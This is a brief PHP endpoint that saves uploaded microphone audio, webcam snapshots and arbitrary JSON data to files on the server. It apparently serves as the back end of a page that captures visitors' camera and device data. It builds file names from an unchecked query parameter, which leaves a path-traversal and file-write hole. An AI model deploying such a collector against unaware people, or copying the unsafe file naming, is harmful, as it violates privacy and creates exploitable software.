<?php
header('Content-Type: application/json');
$type = $_GET['type'] ?? 'unknown';
$raw = file_get_contents('php://input');
$ts = date('Ymd_His');
$r = bin2hex(random_bytes(2));

if ($type === 'audio' && strlen($raw) > 0) {
    file_put_contents("mic_{$ts}_{$r}.webm", $raw);
} elseif ($type === 'webcam') {
    $data = json_decode($raw, true);
    if (isset($data['image'])) {
        $img = substr($data['image'], strpos($data['image'], ',') + 1);
        file_put_contents("webcam_{$ts}_{$r}.jpg", base64_decode($img));
    }
} else {
    $data = json_decode($raw, true);
    file_put_contents("{$type}_{$ts}_{$r}.json", json_encode($data ?: [], JSON_UNESCAPED_UNICODE));
}
echo json_encode(['status' => 'ok']);